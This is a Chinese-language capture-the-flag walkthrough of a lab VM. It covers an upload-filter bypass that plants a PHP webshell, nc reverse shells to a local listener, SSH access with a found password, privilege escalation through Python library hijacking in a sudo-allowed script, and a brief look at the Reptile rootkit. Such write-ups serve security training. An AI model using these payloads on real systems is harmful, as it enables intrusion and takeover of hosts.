做virtualBox的端口映射吧

|   |   |   |
|---|---|---|
|suuk|medim|文件白名单绕过、反弹shell、$paht环境变量更改、python 库劫持提权、Reptile提权、sandfly-processdecloak使用|
# 服务扫描

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p 22,80 192.168.18.238

```
# GetSHell
访问80http://192.168.18.238/
文件上传，白名单限制,只允许图片格式,使用1.php.jpg的方式绕过文件上传，原因可能是因为后端只取点后的第一个后缀进行解析。
```css
POST /upload.php HTTP/1.1

Host: 192.168.18.238

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------58834982911681499741555270890

Content-Length: 365

Origin: http://192.168.18.238

Connection: close

Referer: http://192.168.18.238/

Upgrade-Insecure-Requests: 1



-----------------------------58834982911681499741555270890

Content-Disposition: form-data; name="photo"; filename="1.php.jpg"

Content-Type: image/png



<?php system($_GET['cmd']);?>

-----------------------------58834982911681499741555270890

Content-Disposition: form-data; name="submit"



Upload

-----------------------------58834982911681499741555270890--
```

访问http://192.168.18.238/upload/1.php.jpg?cmd=id

反弹shell
```css
http://192.168.18.238/upload/1.php.jpg?cmd=nc%20-e%20/bin/bash%20192.168.44.128%209001


┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.44.128] from (UNKNOWN) [192.168.44.10] 4854
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -c bash
Script started, file is /dev/null
www-data@kuus:/var/www/html/upload$ 

```

# 提权
tignasse 账号下有个.pass.txt 文件，但是经过测试并没有用
尝试常规的sudo\suid\内核\任务计划\进程分析手段、爆破了一段时间之后,也没结果。实在不想浪费时间了，看了别人的writeup，才知道。这里密码另有隐情！
```c
www-data@kuus:/home$ ls
ls
mister_b  tignasse

www-data@kuus:/home/tignasse$ more .pass.txt
more .pass.txt
716n4553
www-data@kuus:/home/tignasse$ cat .pass.txt
cat .pass.txt
Try harder !

```

hydra
```c
hydra -l tignasse -p 716n4553 ssh://192.168.18.238

[22][ssh] host: 192.168.18.238   login: tignasse   password: 716n4553
```

ssh
```c
┌──(kali㉿kali)-[~]
└─$ sudo ssh tignasse@192.168.18.238

tignasse@kuus:~$ sudo -l
    (mister_b) NOPASSWD: /usr/bin/python /opt/games/game.py

```
tignasse 用户下，可以看到mister_b 用户有个特权脚本
game.py文件由用户mister_b所有，它导入3 个库。可以看到导入的库使用了可能被滥用的相对路径。
1、我们在/opt/games内创建一个名为random.py的文件，其中包含以下内容：
```
import os 
os.system("nc -e /bin/bash 192.168.44.128 9000")
```
2.、将/opt/games添加到PATH：
通过 python 库劫持进行的权限升级，因为 python 会搜索它导入的库，这些库通常是 PATH 中第一个的库，这就是我们在PATH之前添加/opt/games的原因。
3、最后我们使用nc 监听 2334端口，然后使用sudo 执行该脚本后，成功获取mister_b权限

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [192.168.44.128] from (UNKNOWN) [192.168.44.10] 4315
id
uid=1001(mister_b) gid=1001(mister_b) groups=1001(mister_b)
script /dev/null -c bash
Script started, file is /dev/null


mister_b@kuus:~$ cat user.txt
cat user.txt
Ciphura

```

历史记录发现执行了一个二进制文件
```c
mister_b@kuus:~$ cat .bash_history
cat .bash_history
ps -aux |grep root
ss -altp
sudo -l
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
./sandfly-processdecloak
exit

```
sandfly-processdecloak是一个实用程序，用于快速扫描被常见和不常见的可加载内核模块隐形 Rootkit 隐藏的 Linux 进程 ID (PID)，并将其隐藏起来，使它们可见。比如：Diamorphine, Reptile and variants

编译了一个上传上去执行并没有看到隐藏进程，后面找了一下reptile项目，发现reptile 文件夹也是隐藏的。

https://github.com/f0rb1dd3n/Reptile/wiki/Local-Usage